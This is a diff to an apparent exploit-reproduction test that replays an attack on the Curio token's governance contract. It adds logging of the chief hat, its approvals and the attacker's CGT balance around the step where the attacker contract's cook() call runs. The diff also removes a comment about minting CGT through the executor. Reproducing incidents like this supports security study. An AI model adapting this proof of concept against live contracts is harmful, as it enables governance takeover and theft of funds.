@@ -72,25 +72,32 @@ contract Exploit_Curio is TestHarness, TokenBalanceTracker {
         cheat.prank(ATTACKER);
         attackerContract = new Action();
         require(address(attackerContract).code.length != 0, "Attacker's contract deployment failed");
-        console.log("Attacker's contract deployement successful");
+        console.log("Attacker's contract deployement successful at: %s", address(attackerContract));
 
         console.log("\n==== STEP 4: Call cook() on Action, start attack ====");
+        console.log("== Before attack ==");
+        address _hat = chief.hat();
+        console.log("Chief hat: %s", _hat);
+        console.log("Chief approvals: %s", chief.approvals(_hat));
+        console.log("Attacker CGT Balance: %s", cgtToken.balanceOf(address(attackerContract)));
+        console.log("\n");
+
         cheat.startPrank(ATTACKER);
         cgtToken.approve(address(attackerContract), 2 ether); // 0x6a4cb2aa03ebf35f25e9f34a1727f7e0ea34c5e59cebc85b9e9c0729c6b0ad59
         attackerContract.cook(address(cgtToken), 2 ether, 10 ether, 10 ether);
         cheat.stopPrank();
+
+        console.log("\n== After attack ==");
+        _hat = chief.hat();
+        console.log("Chief hat: %s", _hat);
+        console.log("Chief approvals: %s", chief.approvals(_hat));
+        console.log("Attacker CGT Balance: %s", cgtToken.balanceOf(address(attackerContract)));
+
         // the last two params were set to some arbitrary-like values but are unused in the call.
         // Just for profit checks:
         /*
             require(weth.balanceOf(address(this)) >= wethMin, "not enought weth");
             require(dai.balanceOf(address(this)) >= daiMin, "not enought dai");
-        */
-
-        /*
-        // Next steps:
-        1. Mint CGT tokens via executor's contract
-        2. Evaluate if the other previous calls that only emit events (likely changing only some attacker's
-        contract storage) are necessary
         */
     }
 
